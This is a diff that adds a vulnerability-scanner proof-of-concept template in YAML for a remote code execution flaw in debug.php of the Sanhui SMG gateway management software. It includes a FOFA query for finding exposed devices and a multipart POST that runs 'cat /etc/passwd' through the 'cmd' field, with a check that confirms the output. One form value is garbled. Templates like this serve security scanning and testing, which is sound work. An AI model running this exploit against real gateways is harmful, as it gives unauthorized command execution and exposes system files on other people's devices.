@@ -1,0 +1,50 @@
+id: poc-yaml-san-hui-smg-gateway-management-software-debug-php-rce
+info:
+  name: 三汇SMG 网关管理软件 debug.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 三汇SMG 网关管理软件
+  fofa: body="text ml10 mr20" && title="网关管理软件"
+requests:
+- method: POST
+  path: /debug.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7KggIe3eNBrlFMkW
+  data: '------WebKitFormBoundary7KggIe3eNBrlFMkW
+
+    Content-Disposition: form-data; name="comdtype"
+
+
+    1
+
+    ------WebKitFormBoundary7KggIe3eNBrlFMkW
+
+    Content-Disposition: form-data; name="cmd"
+
+
+    cat /etc/passwd
+
+    ------WebKitFormBoundary7KggIe3eNBrlFMkW
+
+    Content-Disposition: form-data; name="run"
+
+
+    ?ц?
+
+    ------WebKitFormBoundary7KggIe3eNBrlFMkW
+
+    '
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && contains(body,"命令执行")
+
+    && contains(title,"后台调试")
+
+    '
+variables: {}
+transport: http
